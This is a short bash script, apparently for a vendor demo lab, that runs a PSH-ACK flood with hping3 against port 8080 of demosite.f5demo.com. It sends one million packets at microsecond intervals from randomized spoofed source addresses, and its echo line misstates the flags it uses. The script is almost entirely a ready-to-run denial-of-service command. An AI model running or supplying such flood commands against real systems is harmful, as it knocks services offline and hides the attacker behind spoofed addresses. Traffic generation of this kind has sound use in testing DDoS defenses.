#!/bin/bash
date
echo "Starting Push-Ack Flood: hping3 -c 1000000 -S -i u5 -p 8080  demosite.f5demo.com"
hping3 -i u5 -c 1000000 -P -A -p 8080  --rand-source demosite.f5demo.com
date
